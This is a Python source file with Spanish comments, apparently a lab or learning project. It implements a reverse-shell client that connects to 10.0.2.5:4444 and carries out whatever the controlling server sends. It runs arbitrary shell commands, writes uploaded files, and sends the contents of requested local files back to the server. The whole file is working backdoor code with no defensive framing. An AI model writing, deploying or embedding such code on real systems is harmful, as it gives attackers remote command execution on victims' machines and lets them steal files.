#!/usr/bin/env python

import socket
import subprocess
import json
import os

class Client():

    def __init__(self, ip, port):
        
        self.ip = ip
        self.port = port

        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # IPV4, conexión sobre TCP
        self.connection.connect((self.ip, self.port))

    def sendData(self, data):

        # Función de envío de datos. Se decodifica el resultado de la ejecución para empaquetarlo en un diccionario y serializarlo en JSON

        dataDec = data.decode()
        dataDeq = dataDec.split("[")
        self.data = {"result": dataDeq}
        jsonData = json.dumps(self.data)
        self.connection.sendall(bytes(jsonData, encoding="utf-8"))  # Se envía todo el buffer: método sendall()

    def receiveData(self):

        # Función de recepción de datos

        jsonData = ""
        
        # Se irá cargando en un bucle los datos ( el comando ) a medida que se reciban hasta poder imprimirlos al completo

        while True:
            try:
                jsonData = bytes(jsonData, encoding="utf-8") + self.connection.recv(1024)
                jsonData = jsonData.decode("utf-8")
                
                comm = json.loads(jsonData)
                return (comm["comm"])

            except:
                continue


    def reqUpload(self, command):

        # Función de descarga de ficheros

        self.filename = command[7:]
        targetFile = os.path.join(os.getcwd(), self.filename)

        with open(targetFile, "a") as fileCr:
            #fileCr.write(" ")
            pass

        self.sendData(bytes(f"Se ha abierto el fichero {self.filename}", encoding="UTF-8"))

        addFile = self.receiveData()
        # Se crea un fichero en local con el mismo nombre en caso de no existir o se añade el contenido si ya existía

        with open(self.filename, "a") as fileC:
            for i in addFile:
                fileC.write(i)

        self.sendData(bytes(f"Se ha escrito el contenido correctamente...", encoding="UTF-8"))


    def reqDownload(self, filename):
        
        # Función de petición de descarga

        self.filename = filename

        # Se lee el fichero pedido para establecerlo como valor de los datos que se enviarán al server

        with open(filename, "r") as fileR:
            self.data = {"result": fileR.readlines()}
        
        jsonData = json.dumps(self.data)
        self.connection.sendall(bytes(jsonData, encoding="utf-8"))  # Se envía todo el buffer: método sendall()
    
    def transfer(self):
        
        while True:
            try:
            
                receivedData = self.receiveData()

                # Se tratan las funciones especiales y los comando comunes

                if str(receivedData[:2]).lower() == "cd":
                    os.chdir(receivedData[3:])

                    newDir = os.getcwd()
                    self.sendData(bytes(f"Se ha cambiado de directorio a {newDir}", encoding="UTF-8"))

                elif str(receivedData[:]).lower() == "clear":
                    pass

                elif "upload" in str(receivedData[:]).lower():
                    self.reqUpload(receivedData)

                elif str(receivedData[:8]).lower() == "download":
                    self.filename = str(receivedData[9:])
                    self.reqDownload(self.filename)

                elif str(receivedData).lower() == "exit" or "conexión" in str(receivedData).lower():
                    print ("Cerrando conexión...")
                    self.connection.close()
                    break

                else:
                    self.command = subprocess.check_output([receivedData], stderr=subprocess.STDOUT, shell=True)
                    self.sendData(self.command)

            except:
                errMessage = "Error con el comando"
                self.command = errMessage
                self.command = bytes(errMessage, encoding="utf-8")
         
                self.sendData(self.command)

client = Client('10.0.2.5', 4444)
client.transfer()

